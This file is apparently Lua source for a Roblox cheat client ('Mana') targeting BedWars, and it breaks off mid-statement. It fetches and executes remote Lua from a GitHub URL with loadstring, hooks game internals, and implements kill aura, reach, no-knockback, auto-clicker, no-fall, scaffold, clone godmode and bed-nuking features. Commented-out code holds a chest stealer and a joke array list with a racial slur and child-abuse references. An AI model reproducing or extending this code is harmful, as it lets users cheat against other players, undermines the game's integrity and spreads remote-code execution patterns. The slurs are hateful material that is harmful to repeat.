repeat task.wait() until game:IsLoaded()

local startTick = tick()

local request = (syn and syn.request) or request or http_request or (http and http.request)
local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport
local setthreadidentityfunc = syn and syn.set_thread_identity or set_thread_identity or setidentity or setthreadidentity
local getthreadidentityfunc = syn and syn.get_thread_identity or get_thread_identity or getidentity or getthreadidentity

--Services
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local TextChatService = game:GetService("TextChatService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")

--Instances
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character
local HumanoidRootPart = Character.HumanoidRootPart
local Humanoid = Character.Humanoid
local Camera = workspace.CurrentCamera
local RealCamera = workspace.Camera
local Mouse = LocalPlayer:GetMouse()
local PlayerGui = LocalPlayer.PlayerGui
local PlayerScripts = LocalPlayer.PlayerScripts
local Leaderstats = LocalPlayer.leaderstats

--Mana instances
local GuiLibrary = Mana.GuiLibrary
local Tabs = Mana.Tabs
local Functions = Mana.funcs

-- Loadstrings
entity = loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/Libraries/entityHandler.lua", true))()

--What do i write here
local getasset = getsynasset or getcustomasset

do
    local oldcharacteradded = entity.characterAdded
    entity.characterAdded = function(plr, char, localcheck)
        return oldcharacteradded(plr, char, localcheck, function() end)
    end
    entity.fullEntityRefresh()
end

local spawn = function(func) 
    return coroutine.wrap(func)()
end

local tweens = {Notification = function(base)
    TweenService:Create(base, TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {Position = UDim2.new(0.438, 0,0.053, 0)}):Play()
end}

local Client = require(game:GetService("ReplicatedStorage").TS.remotes).default.Client
local RemoteFolder = game.ReplicatedStorage:WaitForChild("rbxts_include")["node_modules"]["@rbxts"]["net"]["out"]["_NetManaged"]

local SwordCont = require(game:GetService("Players").LocalPlayer.PlayerScripts.TS.controllers.global.combat.sword["sword-controller"]).SwordController
local sprintthingy = require(game:GetService("Players").LocalPlayer.PlayerScripts.TS.controllers.global.sprint["sprint-controller"]).SprintController
local kbtable = debug.getupvalue(require(game:GetService("ReplicatedStorage").TS.damage["knockback-util"]).KnockbackUtil.calculateKnockbackVelocity, 1)
local InventoryUtil = require(game:GetService("ReplicatedStorage").TS.inventory["inventory-util"]).InventoryUtil
local itemtablefunc = require(game:GetService("ReplicatedStorage").TS.item["item-meta"]).getItemMeta
local ClientHandler = Client
local itemtable = debug.getupvalue(itemtablefunc, 1)
local matchend = require(game:GetService("Players").LocalPlayer.PlayerScripts.TS.controllers.game.match["match-end-controller"]).MatchEndController
local matchstate = require(game:GetService("ReplicatedStorage").TS.match["match-state"]).MatchState
local KnitClient = debug.getupvalue(require(LocalPlayer.PlayerScripts.TS.knit).setup, 6)
local ballooncontroller = KnitClient.Controllers.BalloonController
local queuemeta = require(game:GetService("ReplicatedStorage").TS.game["queue-meta"]).QueueMeta
local clntstorehandlr = require(game.Players.LocalPlayer.PlayerScripts.TS.ui.store).ClientStore
local matchState = clntstorehandlr:getState().Game.matchState
local itemmeta = require(game:GetService("ReplicatedStorage").TS.item["item-meta"])
local itemstuff = debug.getupvalue(require(game:GetService("ReplicatedStorage").TS.item["item-meta"]).getItemMeta, 1)
local UserInputService = game:GetService("UserInputService")

local realchar
local clone
local function clonemake()
    realchar = LocalPlayer.Character
    realchar.Archivable = true
    clone = realchar:Clone()
    clone.Parent = workspace
    LocalPlayer.Character = clone
end

local clonetwo
local function secondclonemake()
    clonetwo = realchar:Clone()
    clonetwo.Parent = workspace
end

spawn(function()
    while wait(1) do
        matchState = clntstorehandlr:getState().Game.matchState
    end
end)

local function getremote(tab)
    for i,v in pairs(tab) do
        if v == "Client" then
            return tab[i + 1]
        end
    end
    return ""
end

function hash(p1)
    local hashmod = require(game:GetService("ReplicatedStorage").TS["remote-hash"]["remote-hash-util"])
    local toret = hashmod.RemoteHashUtil:prepareHashVector3(p1)
    return toret
end

local attackentitycont = Client:Get(getremote(debug.getconstants(getmetatable(KnitClient.Controllers.SwordController)["attackEntity"])))  

function getinv(plr)
    local plr = plr or LocalPlayer
    local thingy, thingytwo = pcall(function() return InventoryUtil.getInventory(plr) end)
    return (thingy and thingytwo or {
        items = {},
        armor = {},
        hand = nil
    })
end

function getsword()
    local sd
    local higherdamage
    local swordslots
    local swords = getinv().items
    for i, v in pairs(swords) do
        if v.itemType:lower():find("sword") or v.itemType:lower():find("blade") then
            if higherdamage == nil or itemstuff[v.itemType].sword.damage > higherdamage then
                sd = v
                higherdamage = itemstuff[v.itemType].sword.damage
                swordslots = i
            end
        end
    end
    return sd, swordslots
end

local function hvFunc(thingg)
    return {thinggg = thingg}
end

local function playsound(id, volume) 
    local sound = Instance.new("Sound")
    sound.Parent = workspace
    sound.SoundId = id
    sound.PlayOnRemove = true 
    if volume then 
        sound.Volume = volume
    end
    sound:Destroy()
end


local function playanimation(id) 
    if isAlive() then 
        local animation = Instance.new("Animation")
        animation.AnimationId = id
        local animatior = LocalPlayer.Character.Humanoid.Animator
        animatior:LoadAnimation(animation):Play()
    end
end

local funnyanim = {
    {CFrame = CFrame.new(0.5, -0.01, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56)), Time = 0.10},
    {CFrame = CFrame.new(0.5, -0.51, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56)), Time = 0.08},
    {CFrame = CFrame.new(0.5, -0.01, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56)), Time = 0.08}
}

local autoblockanim = {
    {CFrame = CFrame.new(-0.01, -0.01, -1.01) * CFrame.Angles(math.rad(-90), math.rad(90), math.rad(0)), Time = 0.08},
    {CFrame = CFrame.new(-0.01, -0.01, -1.01) * CFrame.Angles(math.rad(10), math.rad(70), math.rad(-90)), Time = 0.08},
}

local theotherfunnyanim = {
    {CFrame = CFrame.new(-1.8, 0.5, -1.01) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(-90)), Time = 0.05},
    {CFrame = CFrame.new(-1.8, -0.21, -1.01) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(-90)), Time = 0.05}
}

local kmsanim = {
    {CFrame = CFrame.new(-2.5, -4.5, -0.02) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(-0)), Time = 0.1},
    {CFrame = CFrame.new(-2.5, -1, -0.02) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(-0)), Time = 0.05}
}

local isclone = false

local function getItem(itemName)
	for i5, v5 in pairs(getinv(LocalPlayer)["items"]) do
		if v5["itemType"] == itemName then
			return v5, i5
		end
	end
	return nil
end

local function getwool()
	for i5, v5 in pairs(getinv(LocalPlayer)["items"]) do
		if v5["itemType"]:match("wool") or v5["itemType"]:match("grass") then
			return v5["itemType"], v5["amount"]
		end
	end	
	return nil
end

local Flamework = require(game.ReplicatedStorage["rbxts_include"]["node_modules"]["@flamework"].core.out).Flamework
repeat task.wait() until (Flamework.isInitialized)

local BlockController2 = require(game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"]["@easy-games"]["block-engine"].out.client.placement["block-placer"]).BlockPlacer
local blockcontroller = require(game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"]["@easy-games"]["block-engine"].out).BlockEngine
local BlockEngine = require(LocalPlayer.PlayerScripts.TS.lib["block-engine"]["client-block-engine"]).ClientBlockEngine
local blocktable = BlockController2.new(BlockEngine, getwool())
function placeblockthing(newpos, customblock)
    local placeblocktype = (customblock or getwool())
    blocktable.blockType = placeblocktype
    if blockcontroller:isAllowedPlacement(LocalPlayer, placeblocktype, Vector3.new(newpos.X / 3, newpos.Y / 3, newpos.Z / 3)) and getItem(placeblocktype) then
        return blocktable:placeBlock(Vector3.new(newpos.X / 3, newpos.Y / 3, newpos.Z / 3))
    end
end

local itemtab = debug.getupvalue(require(game:GetService("ReplicatedStorage").TS.item["item-meta"]).getItemMeta, 1)
local CombatConstant = require(game:GetService("ReplicatedStorage").TS.combat["combat-constant"]).CombatConstant

local function getEquipped()
    local typetext = ""
    local obj = (entity.isAlive and LocalPlayer.Character:FindFirstChild("HandInvItem") and LocalPlayer.Character.HandInvItem.Value or nil)
    if obj then
        if obj.Name:find("sword") or obj.Name:find("blade") or obj.Name:find("baguette") or obj.Name:find("scythe") or obj.Name:find("dao") then
            typetext = "sword"
        end
        if obj.Name:find("wool") or itemtab[obj.Name]["block"] then
            typetext = "block"
        end
        if obj.Name:find("bow") then
            typetext = "bow"
        end
    end
    return {["Object"] = obj, ["Type"] = typetext}
end

function SwitchTool(tool)
  game:GetService("ReplicatedStorage").rbxts_include.node_modules["@rbxts"].net.out._NetManaged.SetInvItem:InvokeServer({
    ["hand"] = tool,
  })
  repeat task.wait() until Character.HandInvItem == tool
end

do
    local oldbs
    local conectionkillaura
    local animspeed = {Value = 0.3}
    local AttackSpeed = {Value = 15}
    local AutoRotate = {Value = true}
    local DistVal = {Value = 10}
    local origC0 = game.ReplicatedStorage.Assets.Viewmodel.RightHand.RightWrist.C0
    local katog = Tabs["Blatant"]:CreateToggle({
        ["Name"] = "KillAura",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            if v then
                spawn(function()
                    repeat
                        for i,v in pairs(game.Players:GetChildren()) do
                        wait(0.01)
                            if v.Character and v.Name ~= game.Players.LocalPlayer.Name and v.Character:FindFirstChild("HumanoidRootPart") then
                                    local mag = (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                                if mag <= DistVal.Value and v.Team ~= game.Players.LocalPlayer.Team and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then
                                task.wait(1/AttackSpeed["Value"])
                                local PlayerSword = getEquipped()["Type"]
                                    if getEquipped()["Type"] == "sword" then 
                                        if AutoRotate.Value == true then
                                            local targetPosition = v.Character.Head.Position
                                            local localPosition = LocalPlayer.Character.HumanoidRootPart.Position
                                            local lookVector = (targetPosition - localPosition).Unit
                                            local newYaw = math.atan2(-lookVector.X, -lookVector.Z)
                                            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(localPosition) * CFrame.Angles(0, newYaw, 0)
                                        end
                                        SwordCont:swingSwordAtMouse()
                                    end
                                end
                            end
                        end                    
                    until (not v)
                end)
            end
        end
    })

    AutoRotate = katog:CreateOptionTog({
        ["Name"] = "AutoRotate",
        ["Default"] = true,
        ["Func"] = function()
        end
        
    })
    AttackSpeed = katog:CreateSlider({
        ["Name"] = "AttackSpeed",
        ["Function"] = function() end,
        ["Min"] = 0,
        ["Max"] = 20,
        ["Default"] = 15,
        ["Round"] = 1
    })
    DistVal = katog:CreateSlider({
        ["Name"] = "AttackDistance",
        ["Function"] = function() end,
        ["Min"] = 1,
        ["Max"] = 15,
        ["Default"] = 10,
        ["Round"] = 0
    })
    --[[
    killauraanimval = katog:CreateDropDown({
        ["Name"] = "Anim",
        ["Function"] = function(val)
            if val == "KillMyself" then
                sdfsdf = game:GetService("TweenService"):Create(Camera:WaitForChild("Viewmodel").RightHand.RightWrist, TweenInfo.new(0.1), {C0 = origC0 * CFrame.new(-2.5, -4.5, -0.02) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(-0))})
                sdfsdf:Play()
            elseif val == "Cool" then
                 newewe = game:GetService("TweenService"):Create(Camera.Viewmodel.RightHand.RightWrist, TweenInfo.new(0.1), {C0 = origC0})
                 newewe:Play()
            end
        end,
        ["List"] = {"Cool", "KillMyself", "Beta"},
        ["Default"] = "Cool"
    })
    animspeed = katog:CreateSlider({
        ["Name"] = "AnimationSpeed",
        ["Function"] = function() end,
        ["Min"] = 0.1,
        ["Max"] = 0.5,
        ["Default"] = 0.3,
        ["Round"] = 1
    })
    ]]
end

do
    local velohorizontal = {["Value"] = 0}
    local velovertical = {["Value"] = 0}
    local velocitytog = Tabs["Combat"]:CreateToggle({
        ["Name"] = "Velocity",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            getgenv().veloval = v
            spawn(function()
                if getgenv().veloval then
                    if not Humanoid then return end
                    if Humanoid then
                        kbtable["kbDirectionStrength"] = 0
                        kbtable["kbUpwardStrength"] = 0
                    end
                else
                    kbtable["kbDirectionStrength"] = 100
                    kbtable["kbUpwardStrength"] = 100
                    return
                end
            end)
        end
    })
    velohorizontal = velocitytog:CreateSlider({
        ["Name"] = "Horizontal",
        ["Function"] = function() 
            if Humanoid then
                kbtable["kbDirectionStrength"] = velohorizontal["Value"]
            end
        end,
        ["Min"] = 0,
        ["Max"] = 100,
        ["Default"] = 0,
        ["Round"] = 0
    })
    velovertical = velocitytog:CreateSlider({
        ["Name"] = "Vertical",
        ["Function"] = function() 
            if Humanoid then
                kbtable["kbUpwardStrength"] = velovertical["Value"]
            end
        end,
        ["Min"] = 0,
        ["Max"] = 100,
        ["Default"] = 0,
        ["Round"] = 0
    })
end

do
    local ACC1
    local ACC2
    local testtogttt = {["Value"] = 2}
    local autoclickertog = Tabs["Combat"]:CreateToggle({
        ["Name"] = "AutoClicker",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            if v then
                local holding = false
                ACC1 = UserInputService.InputBegan:connect(function(input, gameProcessed)
                    if gameProcessed and input.UserInputType == Enum.UserInputType.MouseButton1 then
                        holding = true
                    end
                end)
                ACC2 = UserInputService.InputEnded:connect(function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
                        holding = false
                    end
                end)
                spawn(function()
                    repeat
                        task.wait(1/testtogttt["Value"])
                        if holding then
                            if holding == false then return end
                            if getEquipped()["Type"] == "sword" then 
                                if holding == false then return end
                                SwordCont:swingSwordAtMouse()
                            end
                        end
                    until (not v)
                end)
            else
                ACC1:Disconnect()
                ACC2:Disconnect()
                return
            end
        end
    })
    testtogttt = autoclickertog:CreateSlider({
        ["Name"] = "CPS",
        ["Function"] = function() end,
        ["Min"] = 1,
        ["Max"] = 20,
        ["Default"] = 20,
        ["Round"] = 0
    })
end

Tabs["Combat"]:CreateToggle({
    ["Name"] = "NoClickDelay",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        getgenv().funisus = v
        spawn(function()
            if getgenv().funisus and entity.isAlive then
                for i2,v2 in pairs(itemtable) do
                    if type(v2) == "table" and rawget(v2, "sword") then
                        v2.sword.attackSpeed = 0.0000000001
                    end
                    SwordCont.isClickingTooFast = function() return false end
                end
            else
            end
        end)
    end
})

do
    local reachvalue = {["Value"] = 18}
    local reachtog = Tabs["Combat"]:CreateToggle({
        ["Name"] = "Reach",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            getgenv().reachval = v
            if getgenv().reachval then
                CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = reachvalue["Value"]
            else
                CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = 14.4
            end
        end
    })
    reachvalue = reachtog:CreateSlider({
        ["Name"] = "Reach",
        ["Function"] = function() 
            CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = reachvalue["Value"]
        end,
        ["Min"] = 1,
        ["Max"] = 18,
        ["Default"] = 18,
        ["Round"] = 1
    })
end

-- MOVEMENT

function tpreal(t)
    for i,v in pairs(realchar:GetDescendants()) do
        if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
            v.Transparency = t
        elseif v:IsA("Decal") then
            v.Transparency = t
        end
    end
end

local sprint = false
Tabs["Combat"]:CreateToggle({
    ["Name"] = "Sprint",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        sprint = v
        if sprint then
            spawn(function()
                repeat
                    wait()
                    if (not sprint) then return end
                    if sprintthingy.sprinting == false then
                        sprintthingy:startSprinting()
                    end
                until (not sprint)
            end)
        else
            sprintthingy:stopSprinting()
        end
    end
})

    local cloneval = false
    local funiclonegodmodedisab
    funiclonegodmodedisab = Tabs["Utility"]:CreateToggle({
        ["Name"] = "CloneGodmodeFullDisabler",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            cloneval = v
            if cloneval then
                spawn(function()
                    isclone = true
                    clonemake()
                    speedd = 200
                    connectionnnn = game:GetService("RunService").Heartbeat:connect(function()
                        local velo = clone.Humanoid.MoveDirection * speedd
                        clone.HumanoidRootPart.Velocity = Vector3.new(velo.x, LocalPlayer.Character.HumanoidRootPart.Velocity.y, velo.z)
                    end)
                end)
                repeat task.wait() until (matchState == 2)
                funiclonegodmodedisab:Toggle()
            else
                clone:remove()
                LocalPlayer.Character = realchar
                realchar.Humanoid:ChangeState("Dead")
                isclone = false
                connectionnnn:Disconnect()
                return
            end
        end
    })


--[[
local shopthingyshopshop = debug.getupvalue(require(game:GetService("ReplicatedStorage").TS.games.bedwars.shop["bedwars-shop"]).BedwarsShop.getShopItem, 2)
local oldnexttier
local oldtiered
local bypassstpidshoptiers = false
Tabs["Mana"]:CreateToggle({
    ["Name"] = "BypassShopTiers",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        if (bypassstpidshoptiers) then
            for i,v in pairs(shopthingyshopshop) do
                oldtiered = oldtiered or v.tiered
                oldnexttier = oldnexttier or v.nextTier
            end
            for i,v in pairs(shopthingyshopshop) do
                v.tiered = nil
                v.nextTier = nil
            end
        else
            for i,v in pairs(shopthingyshopshop) do
                v.tiered = oldtiered
                v.nextTier = oldnexttier
            end
        end
    end
})

]]


function getmapname()
    for i,v in pairs(game:GetService("Workspace"):GetChildren()) do
        if v.Name == "Map" then
            if v:FindFirstChild("Worlds") then
                for g, c in pairs(v.Worlds:GetChildren()) do
                    if c.Name ~= "Void_World" then
                        return c.Name
                    end
		        end
		    end
		end
	end
end

local lcmapname = getmapname()

Tabs["Blatant"]:CreateToggle({
    ["Name"] = "NoFall",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        if entity.isAlive then
            spawn(function()
                repeat
                    if v == false then return end
                    wait(0.5)
                    game:GetService("ReplicatedStorage").rbxts_include.node_modules["@rbxts"].net.out._NetManaged.GroundHit:FireServer(workspace.Map.Worlds[lcmapname].Blocks,1645488277.345853)
                until v == false
            end)
        end
    end
})

function stealcheststrollage()
    for i,v in pairs(game.Workspace.Map.Worlds[lcmapname]:GetChildren()) do
        if v.Name == "chest" then
            if v:FindFirstChild("ChestFolderValue") then
                local mag = (HumanoidRootPart.Position - v.Position).Magnitude
                if mag <= 45 then
                    for k,b in pairs(v.ChestFolderValue.Value:GetChildren()) do
                        if b.Name ~= "ChestOwner" then
                            game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged["Inventory:ChestGetItem"]:InvokeServer(v.ChestFolderValue.Value,b)
                        end
                    end
                end
            end
        end
    end
end

--[[
Tabs["Utility"]:CreateToggle({
    ["Name"] = "ChestStealer",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        if entity.isAlive then
            repeat
                stealcheststrollage()
                wait()
            until v == false
        end
    end
})
--]]

--[[
    local hackdetector = false
    Tabs["Utility"]:CreateToggle({
        ["Name"] = "HackerDetector",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            hackdetector = v
            if hackdetector then
                repeat task.wait() until (matchState == 2)
                spawn(function()
                    repeat
                        task.wait()
                        if (not hackdetector) then return end
                        for i, v in pairs(game.Players:GetChildren()) do
                            if v:FindFirstChild("HumanoidRootPart") then
                                local oldpos = v.Character.HumanoidRootPart.Position
                                task.wait(0.5)
                                local newpos = Vector3.new(v.Character.HumanoidRootPart.Position.X, 0, v.Character.HumanoidRootPart.Position.Z)
                                local realnewpos = math.floor((newpos - Vector3.new(oldpos.X, 0, oldpos.Z)).magnitude) * 2
                                if realnewpos > 32 then
                                    game:GetService("StarterGui"):SetCore("SendNotification", {
                                        Title = v.Name.." is cheating",
                                        Text = tostring(math.floor((newpos - Vector3.new(oldpos.X, 0, oldpos.Z)).magnitude)),
                                        Duration = 5,
                                    })
                                end
                            end
                        end
                    until (not hackdetector)
                end)
            end
        end
    })
]]

--[[
    do
        local rainbowenab = {["Value"] = false}
        local rainbowspeed = {["Value"] = 4.5}
        local clcickgui = Tabs["Misc"]:CreateToggle({
            ["Name"] = "ClickGui",
            ["Keybind"] = nil,
            ["Callback"] = function(v) end
        })
        clcickgui:CreateOptionTog({
            ["Name"] = "Rainbow",
            ["Func"] = function(val) 
                lib["Rainbow"] = val 
            end
        })
        clcickgui:CreateSlider({
            ["Name"] = "RainbowSpeed",
            ["Function"] = function() end,
            ["Min"] = 1,
            ["Max"] = 20,
            ["Default"] = 4.5,
            ["Round"] = 1
        })
    end

]]

--[[
Tabs["Utility"]:CreateToggle({
    ["Name"] = "FunnyArrayListTroll",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        amongus = v
        if amongus then
            local ScreenGuuii = Instance.new("ScreenGui")
            local uilistlayourthing = Instance.new("UIListLayout")
            local b = Instance.new("TextLabel")
            local c = Instance.new("TextLabel")
            local e = Instance.new("TextLabel")
            local f = Instance.new("TextLabel")
            local a = Instance.new("TextLabel")
            local d = Instance.new("TextLabel")
            ScreenGuuii.Parent = game.CoreGui
            uilistlayourthing.Parent = ScreenGuuii
            uilistlayourthing.HorizontalAlignment = Enum.HorizontalAlignment.Right
            uilistlayourthing.Padding = UDim.new(0, 9)
            b.Name = "b"
            b.Parent = ScreenGuuii
            b.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            b.BackgroundTransparency = 1.000
            b.Position = UDim2.new(0.985937476, 0, 0.0282208584, 0)
            b.Size = UDim2.new(0, 27, 0, 14)
            b.Font = Enum.Font.SourceSansLight
            b.Text = "FatherDisabler"
            b.TextColor3 = Color3.fromRGB(255, 255, 255)
            b.TextSize = 28.000
            c.Name = "c"
            c.Parent = ScreenGui
            c.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            c.BackgroundTransparency = 1.000
            c.Position = UDim2.new(0.985937476, 0, 0.0282208584, 0)
            c.Size = UDim2.new(0, 27, 0, 14)
            c.Font = Enum.Font.SourceSansLight
            c.Text = "CockDisabler"
            c.TextColor3 = Color3.fromRGB(255, 255, 255)
            c.TextSize = 28.000
            e.Name = "e"
            e.Parent = ScreenGui
            e.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            e.BackgroundTransparency = 1.000
            e.Position = UDim2.new(0.985937476, 0, 0.0282208584, 0)
            e.Size = UDim2.new(0, 27, 0, 14)
            e.Font = Enum.Font.SourceSansLight
            e.Text = "NiggaKiller"
            e.TextColor3 = Color3.fromRGB(255, 255, 255)
            e.TextSize = 28.000
            f.Name = "f"
            f.Parent = ScreenGui
            f.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            f.BackgroundTransparency = 1.000
            f.Position = UDim2.new(0.985937476, 0, 0.0282208584, 0)
            f.Size = UDim2.new(0, 27, 0, 14)
            f.Font = Enum.Font.SourceSansLight
            f.Text = "ChildESP"
            f.TextColor3 = Color3.fromRGB(255, 255, 255)
            f.TextSize = 28.000
            a.Name = "a"
            a.Parent = ScreenGui
            a.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            a.BackgroundTransparency = 1.000
            a.Position = UDim2.new(0.985937476, 0, 0.0282208584, 0)
            a.Size = UDim2.new(0, 27, 0, 14)
            a.Font = Enum.Font.SourceSansLight
            a.Text = "NoCumSlowDown"
            a.TextColor3 = Color3.fromRGB(255, 255, 255)
            a.TextSize = 28.000
            d.Name = "d"
            d.Parent = ScreenGui
            d.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            d.BackgroundTransparency = 1.000
            d.Position = UDim2.new(0.985937476, 0, 0.0282208584, 0)
            d.Size = UDim2.new(0, 27, 0, 14)
            d.Font = Enum.Font.SourceSansLight
            d.Text = "AutoGroom"
            d.TextColor3 = Color3.fromRGB(255, 255, 255)
            d.TextSize = 28.000
            makeRainbowText(a, true)
            makeRainbowText(b, true)
            makeRainbowText(c, true)
            makeRainbowText(d, true)
            makeRainbowText(e, true)
            makeRainbowText(f, true)
        else
            ScreenGuuii:Destroy()
        end
    end
})

]]

local oldpos = Vector3.new(0, 0, 0)
local function getScaffold(vec, diagonaltoggle)
    local realvec = Vector3.new(math.floor((vec.X / 3) + 0.5) * 3, math.floor((vec.Y / 3) + 0.5) * 3, math.floor((vec.Z / 3) + 0.5) * 3) 
    local newpos = (oldpos - realvec)
    local returedpos = realvec
    if entity.isAlive then
        local angle = math.deg(math.atan2(-LocalPlayer.Character.Humanoid.MoveDirection.X, -LocalPlayer.Character.Humanoid.MoveDirection.Z))
        local goingdiagonal = (angle >= 130 and angle <= 150) or (angle <= -35 and angle >= -50) or (angle >= 35 and angle <= 50) or (angle <= -130 and angle >= -150)
        if goingdiagonal and ((newpos.X == 0 and newpos.Z ~= 0) or (newpos.X ~= 0 and newpos.Z == 0)) and diagonaltoggle then
            return oldpos
        end
    end
    return realvec
end

local yes
local yestwo
local sussyfunnything
local sussything = false
Tabs["World"]:CreateToggle({
    ["Name"] = "Scaffold",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        sussythingy = v
        if (sussythingy) and entity.isAlive then
            spawn(function()
                yestwo = RunService.Heartbeat:Connect(function(step)
                    if (not sussythingy) then return end
                    local y = LocalPlayer.Character.HumanoidRootPart.Position.y
                    local x = LocalPlayer.Character.HumanoidRootPart.Position.x
                    local z = LocalPlayer.Character.HumanoidRootPart.Position.z
                    if (not sussythingy) then return end
                    local blockpos = getScaffold((LocalPlayer.Character.Head.Position) + Vector3.new(1, -math.floor(LocalPlayer.Character.Humanoid.HipHeight * 3), 0) + LocalPlayer.Character.Humanoid.MoveDirection)
                    if (not sussythingy) then return end
                    placeblockthing(blockpos, getwool())
                end)
            end)
        else
            yestwo:Disconnect()
        end
    end
})

function animfunc(id)
    local Animator = Humanoid:WaitForChild("Animator")
    local Animation = Instance.new("Animation", char)
    Animation.AnimationId = "rbxassetid://"..id
    Animation.Parent = char

    local PlayAnim = Animator:LoadAnimation(Animation)
    PlayAnim:Play()
end

function getblockfrommap(name)
    for i, v in pairs(game.Workspace:GetChildren()) do
        if v:FindFirstChild(name) then
            return v
        end
    end
end

function getbedsxd()
    local beds = {}
    local blocks = game:GetService("Workspace").Map.Worlds[lcmapname].Blocks
    for _,Block in pairs(blocks:GetChildren()) do
        if Block.Name == "bed" and Block.Covers.BrickColor ~= game.Players.LocalPlayer.Team.TeamColor then
            table.insert(beds,Block)
        end
    end
    return beds
end

function getbedsblocks()
    local blockstb = {}
    local blocks = game:GetService("Workspace").Map.Worlds[lcmapname].Blocks
    for i,v in pairs(blocks:GetChildren()) do
        if v:IsA("Part") then
            table.insert(blockstb,v)
        end
    end
    return blockstb
end

function blocks(bed)
    local aboveblocks = 0
    local Blocks = getbedsblocks()
    for _,Block in pairs(Blocks) do
        if Block.Position.X == bed.X and Block.Position.Z == bed.Z and Block.Name ~= "bed" and (Block.Position.Y - bed.Y) <= 9 and Block.Position.Y > bed.Y then
            aboveblocks = aboveblocks + 1
        end
    end
    return aboveblocks
end

function nuker()
    local beds = getbedsxd()
    for _,bed in pairs(beds) do
        local bedmagnitude = (bed.Position - game.Players.LocalPlayer.Character.PrimaryPart.Position).Magnitude
            local upnum = blocks(bed.Position)
            local x = math.round(bed.Position.X/3)
            local y = math.round(bed.Position.Y/3) + upnum
            local z = math.round(bed.Position.Z/3)
            game:GetService("ReplicatedStorage").rbxts_include.node_modules["@rbxts"].net.out._NetManaged.DamageBlock:InvokeServer({
                ["blockRef"] = {
                    ["blockPosition"] = Vector3.new(x,y,z)
                },
                ["hitPosition"] = Vector3.new(x,y,z),
                ["hitNormal"] = Vector3.new(x,y,z),
            })
    end
end

--[[
Tabs["Utility"]:CreateToggle({
    Name = "InstantPickup",
    Keybind = nil,
    Callback = function(v)
        if v then
            wait()
            local Character = game.Players.LocalPlayer.Character
            if Character and Character.Humanoid.Health > 0 then
                local itemDrops = workspace.ItemDrops:GetChildren()
                
                for i, itemDrop in ipairs(itemDrops) do
                    local humanoidRootPart = Character.HumanoidRootPart
                    if humanoidRootPart and (itemDrop.Position - humanoidRootPart.Position).Magnitude <= 10 then
                        local x, y, z = math.ceil(itemDrop.Position.X / 3), math.ceil(itemDrop.Position.Y / 3), math.ceil(itemDrop.Position.Z / 3)
                        RemoteFolder.PickupItemDrop:InvokeServer({ itemDrop = itemDrop })
                    end
                end
            end
        end
    end
})

]]

--[[
Tabs["Legit"]:CreateToggle({
    ["Name"] = "BedNuker",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        local BedNuker = v
        if BedBuker then
            spawn(function()
                repeat
                    wait()
                    if entity.isAlive then
                        wait(0.25)
                        if (not bedrekterval) then return end
                        nuker()
                    end
                until (not bedrekterval)
            end)
        end
    end
})
]]

local LightingBrightness = {["Value"] = 2}
local LightingSunRaysSpread = {["Value"] = 0.5}
local LightingColorCorrectionContrast = {["Value"] = 0.01}
local LightingColorCorrectinSaturation = {["Value"] = 0.1}
local Light = Tabs["Render"]:CreateToggle({
    ["Name"] = "Lighting",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        if v == true then
            game.Lighting.Brightness = LightingBrightness["Value"]
            game.Lighting.SunRays.Spread = LightingSunRaysSpread["Value"]
            game.Lighting.ColorCorrection.Contrast = LightingColorCorrectionContrast["Value"]
            game.Lighting.ColorCorrection.Saturation = LightingColorCorrectinSaturation["Value"]
        else

        end
    end
})

LightingBrightness = Light:CreateSlider({
        ["Name"] = "Brightness",
        ["Function"] = function()
        game.Lighting.Brightness = LightingBrightness["Value"]
        end,
        ["Min"] = 0,
        ["Max"] = 20,
        ["Default"] = 3,
        ["Round"] = 0
    })
    
LightingSunRaysSpread = Light:CreateSlider({
        ["Name"] = "SunRaysSpread",
        ["Function"] = function()
        game.Lighting.SunRays.Spread = LightingSunRaysSpread["Value"]
